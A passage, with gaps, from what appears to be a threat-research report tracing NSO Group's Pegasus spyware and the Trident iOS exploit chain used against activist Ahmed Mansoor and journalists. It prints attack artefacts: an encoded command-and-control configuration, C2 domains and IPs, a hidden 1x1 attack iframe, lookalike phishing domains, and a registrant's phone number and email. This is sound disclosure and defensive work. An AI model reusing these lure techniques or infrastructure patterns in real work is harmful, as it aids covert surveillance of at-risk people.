Visiting a maliciously crafted website may lead to arbitrary code execution\nCVE-2016-4655: An application may be able to disclose kernel memory\nCVE-2016-4656: An application may be able to execute arbitrary code with kernel privileges\n\n\nOnce we confirmed the presence of what appeared to be iOS zero-days, Citizen Lab and Lookout quickly initiated a responsible disclosure process by notifying Apple and sharing our findings. Apple responded promptly, and notified us that they would be addressing the vulnerabilities. We are releasing this report to coincide with the availability of the iOS 9.3.5 patch, which blocks the Trident exploit chain by closing the vulnerabilities that NSO Group appears to have exploited and sold to remotely compromise iPhones.\nRecent Citizen Lab research has shown that many state-sponsored spyware campaigns against civil society groups and human rights defenders use “just enough” technical sophistication, coupled with carefully planned deception. This case demonstrates that not all threats follow this pattern.  The iPhone has a well-deserved reputation for security.  As the iPhone platform is tightly controlled by Apple, technically sophisticated exploits are often required to enable the remote installation and operation of iPhone monitoring tools. These exploits are rare and expensive. Firms that specialize in acquiring zero-days often pay handsomely for iPhone exploits.  One such firm, Zerodium, acquired an exploit chain similar to the Trident for one million dollars in November 2015.\nThe high cost of iPhone zero-days, the apparent use of NSO Group’s government-exclusive Pegasus product, and prior known targeting of Mansoor by the UAE government provide indicators that point to the UAE government as the likely operator behind the targeting. \nRemarkably, this case marks the third commercial “lawful intercept” spyware suite employed in attempts to compromise Mansoor.  In 2011, he was targeted with FinFisher’s FinSpy spyware, and in 2012 he was targeted with Hacking Team’s Remote Control System.  Both Hacking Team and FinFisher have been the object of several years of revelations highlighting the misuse of spyware to compromise civil society groups, journalists, and human rights workers.\nFigure 1: Ahmed Mansoor, the “Million Dollar Dissident.”\nThe attack on Mansoor is further evidence that “lawful intercept” spyware has significant abuse potential, and that some governments cannot resist the temptation to use such tools against political opponents, journalists, and human rights defenders. Our findings also highlight the continuing lack of effective human rights policies and due diligence at spyware companies, and the continuing lack of incentives to address abuses of “lawful intercept” spyware.\nOur report proceeds as follows:\n\nSection 2 provides an overview of the attack against Ahmed Mansoor.\nSection 3 details NSO Group’s tradecraft, gleaned from what appears to be a copy of NSO Group documentation leaked in the Hacking Team emails.\nSection 4 summarizes our technical analysis of the attack against Mansoor (in collaboration with Lookout).\nSection 5 describes how we found what appears to be the NSO Group’s mobile attack infrastructure while working on our previous Stealth Falcon report.\nSection 6 links the spyware used in the attack on Mansoor to NSO Group.\nSection 7 outlines evidence of other individuals targeted with the infrastructure that we linked to NSO Group, including Mexican journalist Rafael Cabrera.\nSection 8 explains how the attack on Mansoor fits into the context of ongoing attacks on UAE dissidents.\nSection 9 concludes the report.\n\n \n2. Ahmed Mansoor Targeted With iPhone Zero-Day\nAhmed Mansoor is an internationally recognized human rights defender, blogger, and member of Human Rights Watch’s advisory committee.  Mansoor, who is based in the UAE, was jailed for eight months in 2011 along with four other activists for supporting a pro-democracy petition.  After he was released, Mansoor’s passport was confiscated, his car was stolen, and $140,000 disappeared from his bank account.  Mansoor is banned from traveling overseas, and his work continues to attract significant harassment and punishment\nOn the morning of August 10, 2016, Mansoor received an SMS text message that appeared suspicious. The next day he received a second, similar text. The messages promised “new secrets” about detainees tortured in UAE prisons, and contained a hyperlink to an unfamiliar website. The messages arrived on Mansoor’s stock iPhone 6 running iOS 9.3.3.\n\nFigure 2: Ahmed Mansoor received suspicious text messages in August 2016.  Credit: Martin Ennals Foundation.\nMansoor quickly forwarded the messages to Citizen Lab researchers for investigation.  He has good reason to be concerned about unsolicited messages: every year since 2011, Mansoor has been targeted with spyware attacks, including with FinFisher spyware in 2011 and Hacking Team spyware in 2012 (see Section 8: Ahmed Mansoor and Previous UAE Attacks).\n \nFigure 3: SMS text messages received by Mansoor (English: “New secrets about torture of Emiratis in state prisons”).  The sender’s phone numbers are spoofed.\nWhen Mansoor’s messages reached us, we recognized the links: the domain name webadv.co belongs to a network of domains that we believe to be part of an exploit infrastructure provided by the spyware company NSO Group (see Section 6: Linking NSO Group Products to the Attack on Mansoor).  We had first come across the NSO Group infrastructure during the course of our earlier research into Stealth Falcon, a UAE-based threat actor (see Section 5: Tracking a Mobile Attack Infrastructure).  \nWhen we first found the infrastructure and connected it to NSO Group, we hypothesized that operators of the NSO Group spyware would target a user by sending them an infection link containing one of the exploit infrastructure domain names.  Though we had previously found several public occurrences of links involving these domains on Twitter (see Section 7: Evidence of Other Targets), none of the links we found seemed to be active (i.e., none produced an infection when we tested them).  In other exploit infrastructures with which we are familiar (e.g., Hacking Team’s exploit infrastructure), we had noted that operators prefer to deactivate such links after a single click, or after a short period of time, perhaps in order to prevent the disclosure of the exploit to security researchers.\nWe accessed the link Mansoor provided us on our own stock factory-reset iPhone 5 (Mansoor had an iPhone 6) with iOS 9.3.3 (the same version as Mansoor).  When we clicked the link, we saw that it was indeed active, and watched as unknown software was remotely implanted on our phone.  This suggested that the link contained a zero-day iPhone remote jailbreak: a chain of heretofore unknown exploits used to remotely circumvent iPhone security measures.  To verify our observations, we shared our findings with Lookout Security.  Both research teams determined that Mansoor was targeted with a zero-day iPhone remote jailbreak. The chain of exploits, which we are calling the Trident, included the following (see Section 4: The Trident iOS Exploit Chain and Payload for more details):\n\nCVE-2016-4657: An exploit for WebKit, which allows execution of the initial shellcode\nCVE-2016-4655: A Kernel Address Space Layout Randomization (KASLR) bypass exploit to find the base address of the kernel\nCVE-2016-4656: 32 and 64 bit iOS kernel exploits that allow execution of code in the kernel, used to jailbreak the phone and allow software installation\n\nThe implant installed by the Trident exploit chain would have turned Mansoor’s iPhone into a digital spy in his pocket. The spyware, which appears to be NSO’s Pegasus spyware solution, was capable of employing his iPhone’s camera and microphone to eavesdrop on activity in the vicinity of the device, recording his WhatsApp and Viber calls, logging messages sent in mobile chat apps, and tracking his movements.\n \n3. NSO Group and the Pegasus Solution\nThe attack on Mansoor appears to have used Pegasus, a remote monitoring solution sold by NSO Group Technologies Ltd (see Section 6: Linking NSO Group Products to the Attack on Mansoor).  NSO Group, based in Herzelia, Israel (CR# 514395409), develops and sells mobile phone surveillance software to governments around the world.  The company describes itself as a “leader” in “mobile and cellular Cyber Warfare,” and has been operating for more than six years since its founding in 2010.\nNSO Group appears to be owned by a private equity firm with headquarters in San Francisco: Francisco Partners Management LLC, which reportedly acquired it in 2014 after approval from the Israeli Defense Ministry.  However, as of November 2015, Francisco Partners was reportedly exploring selling NSO Group, with a stated valuation of up to $1 billion. Interestingly, Francisco Partners previously invested in Blue Coat, a company selling network filtering and monitoring solutions, whose technology has been used by repressive regimes according to previous Citizen Lab research.\n\nFigure 4: Image from an NSO Group brochure posted on SIBAT (The International Defense Cooperation Directorate of the Israel Ministry of Defense).\nNSO Group has largely avoided the kind of high profile media attention that companies like Hacking Team and FinFisher have sometimes courted. The company maintains no website, there is little concrete information about NSO Group’s Pegasus product available online, and we know of no prior technical analysis of NSO Group’s products or infrastructure.\nSome previous media reports have linked NSO Group and Pegasus to a scandal involving potential illegal eavesdropping in Panama, and possible sales to Mexico.  Other reports have suggested that NSO Group’s activities have aroused concern within the United States intelligence community.\nTwo of NSO Group’s three co-founders, Shalev Hulio and Omri Lavie, are also co-founders of mobile security company Kaymera, which promises a “Multi Layered Cyber Defense Approach” to clients.  On Kaymera’s website, the company reprints a Bloomberg article pointing out that they “play both sides of the cyber wars.”  The article also quotes NSO Group’s CEO, who suggests that they entered the defense business when potential clients saw the capabilities of NSO Group’s tools.\n\nFigure 5: Kaymera’s website promises comprehensive mobile security\n \n3.1. Pegasus Documents in Hacking Team Leak\nMuch of the publicly available information about Pegasus seems to be rumor, conjecture, or unverifiable claims made to media about capabilities. However, when we examined the Hacking Team emails leaked online after a 2015 breach, we found several instances of Hacking Team clients or resellers sharing what appeared to be NSO Group’s product documentation and sales pitches.\nFor instance, in December 2014, a reseller of surveillance technologies to the Mexican government forwarded a PDF document containing detailed technical specifications of NSO Group’s Pegasus system to Hacking Team.  According to the document’s metadata, it appears to have been created in December 2013 by Guy Molho, who is listed on LinkedIn as the Director of Product Management at NSO Group.\n \n3.2. Device Infection\nAccording to the purported 2013 NSO Group Pegasus documentation found in the Hacking Team materials, NSO Group offers two remote installation vectors for spyware onto a target’s device: a zero-click vector, and a one-click vector.  The one-click vector involves sending the target a normal SMS text message with a link to a malicious website.  The malicious website contains an exploit for the web browser on the target’s device, and any other required exploits to implant the spyware. In the attack against Mansoor, the Trident exploit chain was used.\nTo use NSO Group’s zero-click vector, an operator instead sends the same link via a special type of SMS message, like a WAP Push Service Loading (SL) message.  A WAP Push SL message causes a phone to automatically open a link in a web browser instance, eliminating the need for a user to click on the link to become infected. Many newer models of phones have started ignoring or restricting WAP Push messages.  Mobile network providers may also decide to block these messages.\n\nFigure 6: Diagram from purported NSO Group Pegasus documentation showing the sequence through which the spyware (“Agent”) is installed on a target’s mobile device.  Source: Hacking Team Emails.\nThe documentation refers to a malicious website employed in installation of the spyware (“Agent”) as an Anonymizer, which communicates with a Pegasus Installation Server located on the operator’s premises.  When a target visits a malicious link from their device, the Anonymizer forwards the request to the Pegasus Installation Server, which examines the target device’s User-Agent header to determine if Pegasus has an exploit chain, such as the Trident, that supports the device. \nIf the device is supported, the Pegasus Installation Server returns the appropriate exploit to the target device through the Anonymizer and attempts an infection.  If infection fails for any reason, the target’s web browser will redirect to a legitimate website specified by the Pegasus operator, in order to avoid arousing the target’s suspicion.\nIn the operation targeting Mansoor, the one-click vector was used, with anonymizer sms.webadv.co (see Section 4: The Trident iOS Exploit Chain and Payload for more details).\n \n3.3. Data Collection\nAccording to the purported NSO Group documentation, once successfully implanted on a phone using an exploit chain like the Trident, Pegasus can actively record or passively gather a variety of different data about the device.  By giving full access to the phone’s files, messages, microphone and video camera, the operator is able to turn the device into a silent digital spy in the target’s pocket.\n\n\nFigure 7: Diagram from purported NSO Group Pegasus documentation showing the range of information gathered from a device infected with Pegasus.  Source: Hacking Team Emails.\nIn the spyware used in targeting Mansoor, we confirmed many elements of this functionality, and observed indications that the collection of the following types of data was supported, among others (see Section 4.2: The Payload for more details):\n\nCalls made by phone, WhatsApp and Viber,\nSMS messages, as well as messages and other data from popular apps like Gmail, WhatsApp, Skype, Facebook, KakaoTalk, Telegram, and others,\nA wide range of personal data, such as calendar data and contact lists, as well as passwords, including Wi-Fi passwords.\n\n \n3.4. Exfiltration\nAccording to the purported NSO Group documentation, an infected device transmits collected information back to a Pegasus Data Server at the operator’s premises, via the PATN (Pegasus Anonymizing Transmission Network).  The PATN appears to be a proxy chain system similar to Hacking Team’s anonymizers and FinFisher’s relays. The chain is intended to obfuscate the identity of the government client associated with a particular operation.  Once the collected information arrives on the Pegasus Data Server, an operator may visualize the information on a Pegasus Working Station.\n\nFigure 8: A purported screenshot of NSO Group’s Pegasus Working Station software, which visualizes location data collected from infected devices (as of March 2012).  Source: Hacking Team Emails.\nThe implant in the attack targeting Mansoor communicated with two PATN nodes: aalaan.tv and manoraonline.net.  The first of these, aalaan.tv, appears to be a lookalike domain for the legitimate alaan.tv, a Gulf-based satellite television channel (see Section 5.2 for more details on lookalike domains observed in apparent NSO Group infrastructure).\n \n3.5. Prioritizing Stealth\nOne interesting design decision of NSO Group’s Pegasus system, according to the purported NSO Group documentation, is that it emphasizes stealth above almost all else.  As the documentation states:\nIn general, we understand that it is more important that the source will not be exposed and the target will suspect nothing than keeping the agent alive and working.\nCertain Pegasus features are only enabled when the device is idle and the screen is off, such as “environmental sound recording” (hot mic) and “photo taking.”  The documentation also states that the spyware implements a “self-destruct mechanism,” which may be activated automatically “in cases where a great probability of exposing the agent exists.”  However, the documentation claims that sometimes Pegasus removal can result in an infected device rebooting immediately after removal.\n \n4. The Trident iOS Exploit Chain and Payload\nIn this section, we describe our technical analysis of the attack on Mansoor, including the Trident iOS Exploit chain and payload. Given the accelerated timeframe of this case, we are publishing the results of a preliminary analysis.\nRecall that the investigation that led to the discovery of the Trident exploit chain began when UAE human rights activist Ahmed Mansoor forwarded to Citizen Lab two suspicious links that he received via SMS on his iPhone (Section 2).  Suspecting the links to be iPhone spyware associated with NSO Group (Section 6), we accessed them from our own stock factory-reset iPhone 5 running iOS 9.3.3.  Mansoor’s device is an iPhone 6, running iOS 9.3.3; we did not have an iPhone 6 available for testing.  Although the latest iOS version when Mansoor received the links was 9.3.4, this version had been released only one week beforehand.\nWe accessed the links by opening Safari on our iPhone, and manually transcribing the links from the screenshots that Mansoor sent.  After about ten seconds of navigating to the URL, which displayed a blank page, the Safari window closed, and we observed no further visual activity on the iPhone’s screen.  Meanwhile, we saw that the phone was served what appeared to be a Safari exploit, followed by intermediate files (final111), and a final payload (test111.tar). The first two payloads form the Trident exploit chain, and test111.tar is the payload.\n\nFigure 9: Requests from our phone to sms.webadv.co as we clicked on the malicious link.  The first request is our click on the link.  The requests for ntf_bed.html, ntf_brc.html, and test111.tar are conducted by a stage2 binary (in final111).  All previous requests are conducted by Safari.\nSuspecting what we had observed to be the work of a zero-day iPhone remote jailbreak, we shared the exploit and payloads with colleagues at Lookout Security, initiated a responsible disclosure process with Apple, and sent Apple the exploit and payloads.\n \n4.1. The Trident Exploit Chain\nThis section provides a high-level overview of the Trident exploit chain used in the attack against Mansoor.  For further details, see Lookout’s report.\nWhen a user opens the links sent to Mansoor on an iPhone, a stage1 containing obfuscated JavaScript is downloaded. The JavaScript downloads (via XMLHttpRequest) stage2 binaries for either 32-bit (iPhone 5 and earlier) or 64-bit (iPhone 5s and later), depending on the type of device.  The stage1 employs a previously undocumented memory corruption vulnerability in WebKit to execute this code within the context of the Safari browser (CVE-2016-4657).\nThe stage2 exploits a function that returns a kernel memory address, from which the base address of the kernel can be mapped (CVE-2016-4655).  The stage2 then employs a memory corruption vulnerability in the kernel (CVE-2016-4656).  This last vulnerability is employed to disable code signing enforcement, allowing the running of unsigned binaries.  The stage2 downloads and installs the stage3, which is the spyware payload.\n \n4.2. The Payload\nThis section provides a high-level overview of the functionality of the spyware payload.  For more details, see Lookout’s report.\n4.2.1. Persistence\nThe Trident is re-run locally on the phone at each boot, using the JavaScriptCore binary.  To facilitate persistence, the spyware disables Apple’s automatic updates, and detects and removes other jailbreaks.\n4.2.2. Recording\nThe attack payload includes a renamed copy of Cydia Substrate, a third-party app developer framework, which it uses to help facilitate recording of messages and phone calls from targeted apps.  To record WhatsApp and Viber calls, the spyware injects WhatsApp and Viber using the Cydia Substrate, hooks various call status methods, and sends system-wide notifications when call events occur; the spyware listens for these notifications and starts or stops recording as appropriate.  It appears that the payload can spy on apps including: iMessage, Gmail, Viber, Facebook, WhatsApp, Telegram, Skype, Line, KakaoTalk, WeChat, Surespot, Imo.im, Mail.Ru, Tango, VK, and Odnoklassniki.\nThe spyware also exfiltrates calendar and contact data, as well as passwords saved in the phone’s keychain, including Wi-Fi passwords and networks.\n4.2.3. Exfiltration\nThe attack payload beacons back to command and control (C2) servers delivered in stage2 of the Trident, via HTTPS.  One of the binaries in the stage2 of the link sent to Mansoor contained the following string:\n\nWW91ciBHb29nbGUgdmVyaWZpY2F0aW9uIGNvZGUgaXM6NTY3ODQyOQpodHRwOi8vZ21haWwuY29tLz96PUZFY0NBQT09Jmk9TVRwaFlXeGhZVzR1ZEhZNk5EUXpMREU2YldGdWIzSmhiMjVzYVc1bExtNWxkRG8wTkRNPSZzPXpwdnpQU1lTNjc0PQ==\r\n\n\nThe Base64 string decodes to:\n\nYour Google verification code is:5678429\r\nhttp://gmail.com/?z=FEcCAA==&i=MTphYWxhYW4udHY6NDQzLDE6bWFub3Jhb25saW5lLm5ldDo0NDM=&s=zpvzPSYS674=\r\n\n\nThis appears designed to look like a text message from Google containing a two-factor authentication code, though legitimate Google messages of this type do not contain a link, and contain one fewer digit in the verification code.  Base64-decoding the “i” parameter of the URL yields:\n\n1:aalaan.tv:443,1:manoraonline.net:443\r\n\n\nThese are the C2 servers for the spyware sent to Mansoor: aalaan.tv and manoraonline.net.\nA similar obfuscation appears to be used for exchange of information over SMS between an infected phone and the C2 Server.  In case the spyware’s C2 servers are disabled or unreachable, an operator may deliver updated C2 servers to an infection using this type of SMS, similar to FinFisher’s “emergency configuration update” functionality.\n \n5. Tracking a Mobile Attack Infrastructure\nThis section explains how we first identified what appeared to be a mobile attack infrastructure while tracking Stealth Falcon.  We then outline some basic observations about the infrastructure, including themes in the domain names used by the attackers.  We link the infrastructure we found to NSO Group in Section 6.\n \n5.1. Stealth Falcon Leads Us to a Mobile Attack Infrastructure\nA year or so before Ahmed Mansoor received his suspicious SMS messages, we were tracking Stealth Falcon, a threat actor targeting individuals critical of the UAE government at home and abroad, several of whom were later arrested. For full details on Stealth Falcon, read our May 2016 report.\nIn the course of our investigation, we traced Stealth Falcon’s spyware to dozens of different command and control (C2) domains. One server that matched our C2 fingerprint for Stealth Falcon’s custom spyware, icloudcacher.com, was connected to the email address pn1g3p@sigaint.org, according to data in its DNS SOA record.  The same email address appeared in WHOIS records for the following three domains:\n\nasrarrarabiya.com\r\nasrararabiya.co\r\nasrararablya.com\r\n\n\nThese domains did not match our Stealth Falcon fingerprint. As we examined the domains, however, we found that the index page on these domains contained an iframe pointing to the website asrararabiya.com (Asrar Arabiya, or “Arabian Secrets” in English), which appears to be a benign website that takes a critical view of the Arab World’s “dictatorships.”  The index page also contained a nearly invisible iframe pointing to an odd looking site, smser.net.\n\n<iframe src=\"https://smser.net/9918216t/\" width=\"1\" height=\"1\" border=\"0\"></iframe>\r\n<iframe src=\"http://asrararabiya.com/\" style=\"width:100%; height:1200px; position:absolute; top:-5px; left:-5px;\" border=\"0\"></iframe>\r\n\n\nFigure 10: HTML content of the index page on the three fake “Asrar Arabiya” domains.\nWe suspect that the three domains we identified were attempting to mislead users into believing they were visiting the legitimate asrararabiya.com website.  Since we had linked the operation to Stealth Falcon, we suspected that the additional domain, smser.net, might be an attack domain.  We visited the URL in the iframe, https://smser.net/9918216t/, and were redirected to https://smser.net/redirect.aspx.\n\n<html><head><meta http-equiv='refresh' content='0;url=http://www.google.com' /><meta http-equiv='refresh' content='1;url=http://www.google.com' /><title></title></head><body></body></html>\r\n\n\nFigure 11: HTML content of https://smser.net/redirect.aspx.  The page tells the web browser to redirect the visitor to Google.\nWe devised a number of fingerprints for various behaviors of smser.net, checked Shodan and Censys, and conducted our own scanning with zmap to identify related servers.  We found 237 live IP addresses, and extracted their domain names from the SSL certificates returned by the each server.  The SSL certificates we found included *.webadv.co, manoraonline.net, and aalaan.tv, the three domains in the spyware attack sent to Mansoor.\nWe linked these IPs and domain names to what appears to be NSO Group exploit infrastructure.\n \n5.2. Coding the Domain Names\nWe coded the domain names we found, and identified several common themes, perhaps indicating the type of bait content that targets would receive.  Interestingly, the most common theme among the domains we identified was “News Media,” perhaps indicating the use of fake news articles to trick targets into clicking on spyware links.  An example of one such attack in action is the targeting of Mexican journalist Rafael Cabrera (Section 7.1).\nWe also noted the prevalence of themes we had seen in other spearphishing attacks, e.g., online accounts, document sharing, shipment tracking, corporate account portals. Another common theme was ISPs, perhaps because a target may trust an SMS appearing to come from an ISP or Telco they subscribe to.\n\nFigure 12: Most commonly recurring domain name themes.\nAlarmingly, some of the names suggested a willingness on the part of the operators to impersonate governments and international organizations. For example, we found two domain names that appear intended to masquerade as an official site of the International Committee of the Red Cross (ICRC):  icrcworld.com and redcrossworld.com.\nWe also identified the domain topcontactco.com which may be a lookalike for tpcontact.co.uk, a website belonging to Teleperformance, a company that has managed UK visa application processing in many countries. \n\nFigure 13: Screenshot from an article published by the UK Government on how to apply for a visa.\nVisa applicants are required to visit the legitimate tpcontact.co.uk website as part of the online visa application process. We found similar evidence of government-themed sites hinting at Mexico and Kenya.\nThe following table provides further examples of themes found in the domain names.\n\n\n\nType\nExample\nImpersonating\n\n\nNews Media\nalljazeera.co\nbbc-africa.com\ncnn-africa.co\nunonoticias.net\nunivision.click\nAljazeera\nBBC\nCNN\nLas Ultimas Noticias\nUnivision\n\n\nShipment Tracking\ntrack-your-fedex-package.org\nFedEx\n\n\nISP / Telco\nmz-vodacom.info\niusacell-movil. com.mx\nsabafon.info\nnewtarrifs.net\nVodacom (Mozambique)\nIusacell (Mexico)\nSabafon (Yemen)\nGeneric\n\n\nPopular Online Platforms\ny0utube.com.mx\nfb-accounts.com\ngoogleplay-store.com\nwhatsapp-app.com\nYouTube\nFacebook\nGoogle\nWhatsApp\n\n\nAccount Info.

Linking NSO Group Products to the Attack on Mansoor\nIn this section, we explain why we believe the attack on Ahmed Mansoor incorporated the use of NSO Group’s Pegasus product.  We explain how we connected the domain name in the link that Ahmed Mansoor received, sms.webadv.co, to a network of domain names that we had mapped out while working on the May 2016 Stealth Falcon report (Section 5). We also highlight links to the UAE.\n \n6.1. Spyware Points to NSO Group’s Pegasus Solution\nThe final payload that we identified, test111.tar, contained several files, including libaudio.dylib, which appeared to be the base library for call recording, libimo.dylib, which appeared to be the library for recording chat messages from apps, and two libraries for WhatsApp and Viber call recording: libvbcalls.dylib, and libwacalls.dylib.  In each file, we found several hundred strings containing the text “_kPegasusProtocol,” the name of NSO Group’s solution.\n\n_kPegasusProtocolAgentControlElement_iv\r\n_kPegasusProtocolAgentControlElement_key\r\n_kPegasusProtocolAgentControlElement_ciphertext\r\n_kPegasusProtocolProtocolElement_iv\r\n_kPegasusProtocolProtocolElement_key\r\n_kPegasusProtocolProtocolElement_ciphertext\r\n_kPegasusProtocolResponseElement_iv\r\n_kPegasusProtocolResponseElement_key\r\n_kPegasusProtocolResponseElement_ciphertext\n\nFigure 16: “Pegasus” strings in the payload.\n \n6.2. Historical Scanning Data Connects Mansoor Attack to NSO Group-linked Infrastructure\nThe links sent to Mansoor used the domain sms.webadv.co. The network of 237 live IP addresses we mapped (Section 5) included 52.8.153.44, to which sms.webadv.co resolves, and which returns an SSL certificate for *.webadv.co. The 237 IPs also included 52.8.52.166 (aalaan.tv) and 162.209.103.68 (manoraonline.net), which were the two C2 servers in the spyware used in targeting Mansoor.\nHowever, the 237 IPs and related domain names that we mapped did not provide insight into the identity of the threat actor. The IP addresses all appeared to be associated with cloud VPS providers, which gave no clue as to the identities of the operators, and the WHOIS information was mostly private. We did note that several domain names had WHOIS registrants based in Israel (e.g., thainews.asia, kenyasms.org).\nWe examined historical scanning data to see whether we could attribute the 237 IPs to a threat actor.  We noted that at least 19 of these IPs had previously returned a different distinctive Google redirect in response to a “GET /”.\n\n\\xef\\xbb\\xbf<HTML><HEAD><META HTTP-EQUIV=\"refresh\" CONTENT=\"0;URL=http://www.google.com/\">\\r\\n<TITLE></TITLE></HEAD><BODY>\\r\\n</BODY></HTML>\r\n\n\nFigure 17: Response to an HTTP GET exhibited by 19 IPs in historical scanning data (note that the first three bytes represent the unicode byte order mark — BOM).\nThese 19 IPs included an IP address that (later) resolved to manoraonline.net, one of the C2 servers for the spyware sent to Mansoor.\nWe then searched the same historical data for other IP addresses that matched this same fingerprint.  Overall, between October 2013 and September 2014, we identified 83 IPs that matched the fingerprint.  We found several IPs of particular interest.  The IP address 82.80.202.200 matched our fingerprint from October 2013 until April 2014.\n\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nLast-Modified: Tue, 04 Jun 2013 15:28:04 GMT\r\nAccept-Ranges: bytes\r\nETag: \"09a91b3861ce1:0\"\r\nServer: Microsoft-IIS/7.5\r\nDate: Mon, 28 Oct 2013 21:23:12 GMT\r\nConnection: close\r\nContent-Length: 127\r\n\\xef\\xbb\\xbf<HTML><HEAD><META HTTP-EQUIV=\"refresh\" CONTENT=\"0;URL=http://www.google.com/\">\r\n<TITLE></TITLE></HEAD><BODY>\r\n</BODY></HTML>\r\n\n\nThe domain name qaintqa.com pointed to this IP address at the same time (from April 2013 to April 2016), according to DomainTools.  The registrant information for this domain is:\n\nRegistrant Street:         Medinat Hayehudim 85\r\nRegistrant City:           hertzliya\r\nRegistrant State/Province: central\r\nRegistrant Postal Code:    46766\r\nRegistrant Country:        IL\r\nRegistrant Phone:          972542228649\r\nRegistrant Email:          lidorg@nsogroup.com\n\nWe also found two other IP addresses of interest that matched the fingerprint: 82.80.202.204 and 54.251.49.214 matched the fingerprint in March 2014.  The former was pointed to by mail1.nsogroup.com from 2014-09-24 to 2015-05-06 (PassiveTotal), the latter was pointed to by nsoqa.com from 2015-09-01 until present (DomainTools).  Both domains are registered to NSO Group.\nGiven these findings, we strongly suspected the network of domain names we uncovered was part of an exploit infrastructure for NSO Group’s mobile spyware.\n \n6.3. Additional UAE Infrastructure\nRecall that our first window into this infrastructure came from our Stealth Falcon research, when we identified the smser.net domain, fingerprinted it, and traced it to 237 live IP addresses that shared the same characteristics (Section 5.1).\nUsing PassiveTotal, we were able to further trace smser.net to seven other domains, indicating Stealth Falcon targeting that appeared to use NSO Group’s Pegasus solution in Qatar (ooredoodeals.com), UAE (alawaeltech.com, which may be a fake mobile phone company based in the Emirate of Ajman), and Bahrain (bahrainsms.co).  Based on our previously published research, we believe there is strong circumstantial evidence to support the conclusion that the operator of Stealth Falcon is connected to an entity within the UAE Government.\nWe also identified five .ae TLDs that all shared the same registrant name (“Gerald Binord”), which may have been used to target people in the UAE.  We further identified another group of domains including damanhealth.online (“Daman Health” is a UAE-based health insurer) and uaenews.online, which also included a domain turkeynewsupdates.com, suggesting an operator that is targeting both UAE and Turkey targets.\n \n7. Evidence of Other Targets\nIn two cases, Mexico and Kenya, we found evidence of other targets who may have been targeted with NSO Group’s Pegasus, based on messages they sent or received containing links that involve domain names we traced to what appears to be a mobile attack infrastructure associated with NSO Group’s Pegasus (see Section 5: Tracking a Mobile Attack Infrastructure).\n \n7.1. Mexico: Politically Motivated Targeting?\nIn the case of Mexico, one target appears to be the journalist Rafael Cabrera, who recently reported on the Casa Blanca controversy, a reported conflict of interest involving the President and First Lady of Mexico.  On August 30, 2015 the journalist Cabrera tweeted that he had received suspicious messages purporting to come from Mexican television station UNO TV.  His tweet included screencaptures of the messages, which said that Mexico’s Presidency was considering defamation claims and imprisonment of reporters related to the Casa Blanca report that Cabrera had worked on.\n\nFigure 18: Messages  purporting to come from UNO TV suggesting that a story he was linked to might result in defamation charges or incarceration. Image via Mexican journalist Rafael Cabrera’s tweet.\nThe English translations of the messages are as follows:\n\nUNOTV.COM/ THE PRESIDENT’S OFFICE WILL SUE FOR DEFAMATION THOSE WHO PUBLISH REPORTING ON CASA BLANCA. NOTE: [MALICIOUS LINK]\nUNOTV.COM/ ON THE TOPIC OF THE CASA BLANCA, THE PRESIDENCY COULD INCARCERATE REPORTERS WHILE THEY LOOK INTO THE NAMES: [MALICIOUS LINK]\n\nThe links in the screenshots expand to http://fb-accounts.com/1074139s/ and http://unonoticias.net/3423768s/.  These match two domain names we linked to the apparent NSO Group infrastructure.  A director at UNO TV responded to Cabrera’s Tweet, saying that these were “…not our messages 100%.”\n\nFigure 19:  A director from UNO TV states that the suspicious SMS messages sent to Cabrera were not from his company. Image via Twitter.\nWe were unable to achieve a successful infection from either link sent to Cabrera, presumably because the links were several months old when we found them, and had been clicked on either by Cabrera himself, or by other interested parties who saw Cabrera’s tweet.\nContinuing our investigation, we made contact with Cabrera and learned that he had been recently targeted with an additional series of messages containing suspicious links.\n\n\n\n\n\n\n\n\n\n\n\n\nFigure 20: Additional SMS messages sent to Rafael Cabrera containing links to the exploit infrastructure. Screenshots courtesy of Rafael Cabrera.\nThe English translations of the messages are as follows (clockwise from top-left):\n\nFacebook reports efforts to access the account of: Rafael Cabrara.

TO VERIFY DETAILS [MALICIOUS LINK]\n[CL Note: this message contains highly profane sexual taunts, followed by a malicious link]\n\nThe fourth message is most noteworthy, as it contained profane and personal sexual taunts, unlike the other messages.  Each of these messages contained a link that would have led, we believe, to the infection of his iPhone with NSO Group’s Pegasus spyware via the Trident exploit.\nSimilar SMS messages have also been reported in other online posts from Mexico.\n \n7.2. Kenya: A Tweet Discussing the Opposition\nIn the case of Kenya, we found a past tweet containing a link to the NSO Group exploit infrastructure from June 3, 2015.  The tweet, sent by a “Senior Research Officer” in the Office of the Senate Minority Leader, references Moses Wetangula, who is the current Minority Leader of Kenya’s Senate.\n\nFigure 21: A Kenya-related link to apparent NSO Group infrastructure.\n \n8. Ahmed Mansoor and Previous UAE Attacks\nIn this section, we provide an overview of previous attacks we have documented against Ahmed Mansoor, and other UAE dissidents.  The technical sophistication of previous attacks we observed pales in comparison to the present attack.\nAhmed Mansoor has been a frequent target of past electronic attacks.  In March 2011, he was targeted with FinFisher spyware disguised as a PDF of a pro-democracy petition he had previously signed.  The spyware arrived in the form of an executable file inside a .rar file attached to an email.  Mansoor noticed that the file was an EXE file rather than a PDF, and did not open it.  Mansoor and four other activists (the “UAE Five”) were imprisoned in April 2011, and charged with insulting the leaders of the UAE.  Mansoor and the others were pardoned in November of the same year.\nIn July of 2012, Ahmed Mansoor’s laptop was infected with Hacking Team spyware delivered via a booby-trapped Microsoft Word document exploiting an old Microsoft Office vulnerability, CVE 2010-3333.  The spyware sent information from his computer to a UAE intelligence agency, apparently operating under the auspices of the office of Sheikh Tahnoon bin Zayed al-Nahyan, a son of the founder of the UAE, and now the UAE Deputy National Security Advisor.  Attackers broke into Mansoor’s email account shortly after the infection.  We assisted Mansoor in recovering from the attack.  Another UAE-based human rights activist, and a UAE-based journalist were also targeted in the same operation.\nIn early 2013, Mansoor was sent a link to a website that attempted to install spyware on his computer by exploiting a public Java vulnerability for which no patch had yet been issued.  He realized the link was suspicious and did not click on it.  Throughout 2013 and 2014, Mansoor was unsuccessfully targeted several times with spyware, mostly XTremeRAT, SpyNet RAT, and njRAT delivered as executable files in attachments or through Google Drive links.  In 2014, Mansoor’s Twitter account was hacked.\nIn a campaign stretching from 2012 until 2016, UAE dissidents at home and abroad were targeted by Stealth Falcon, an attacker likely linked to a UAE government agency.  Stealth Falcon sent out links involving a fake URL shortener that employed Javascript to profile targets’ computers, checked which antivirus programs they had installed, and attempted to deanonymize them if they were using Tor.  Stealth Falcon also sent out Microsoft Word documents containing custom spyware that was installed if a user 